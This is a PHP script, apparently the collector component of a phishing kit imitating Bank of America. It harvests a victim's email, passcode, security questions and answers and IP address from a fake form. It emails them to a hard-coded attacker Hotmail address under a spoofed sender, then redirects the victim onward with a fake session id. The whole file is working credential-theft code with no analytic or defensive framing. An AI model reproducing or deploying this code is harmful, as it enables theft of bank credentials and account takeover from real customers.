<?php
$ip = getenv("REMOTE_ADDR");
$message .= "+############### xSmayer ##############+\n";
$message .= "+############################################+\n";
$message .= "Email            : ".$_POST['formtext1']."\n";
$message .= "PassCode            : ".$_POST['formtext2']."\n";
$message .= "+############################################+\n";
$message .= "Question 1            : ".$_POST['formselect8']."\n";
$message .= "ans 1            : ".$_POST['formtext18']."\n";
$message .= "Question 2            : ".$_POST['formselect9']."\n";
$message .= "ans 2            : ".$_POST['formtext19']."\n";
$message .= "Question 3           : ".$_POST['formselect10']."\n";
$message .= "ans 3           : ".$_POST['formtext20']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "+############################################+\\n";
//Change Your Email Here 
$send = "xSmayer.79@hotmail.com";
$subject = "BOA INFOS LOADING 75% : $ip"; 
$headers = "From: xSmayer<customer@xblack.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$praga=rand();
$praga=md5($praga);
header("Location: info.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

	 
?>